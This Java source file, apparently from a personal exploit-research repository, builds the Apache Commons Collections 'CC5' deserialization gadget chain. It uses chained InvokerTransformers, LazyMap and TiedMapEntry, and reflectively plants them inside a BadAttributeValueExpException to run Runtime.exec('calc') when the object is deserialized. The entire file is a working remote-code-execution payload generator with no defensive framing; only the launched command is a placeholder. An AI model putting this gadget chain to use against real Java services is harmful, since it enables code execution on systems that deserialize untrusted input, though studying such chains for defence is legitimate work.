package com.yyjccc.CommonsExp;

import com.yyjccc.Utils.Tool;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class Cc5 {
    public static Object cc5() throws Exception {
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
        HashMap<Object,Object> hashMap=new HashMap<>();
        Map<Object,Object> decoratemap= LazyMap.decorate(hashMap,chainedTransformer);
        TiedMapEntry tiedMapEntry=new TiedMapEntry(decoratemap,"aaa");
        //
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Class<? extends BadAttributeValueExpException> c = badAttributeValueExpException.getClass();
        Field valfeild = c.getDeclaredField("val");
        valfeild.setAccessible(true);
        valfeild.set(badAttributeValueExpException,tiedMapEntry);
        return badAttributeValueExpException;
    }
}
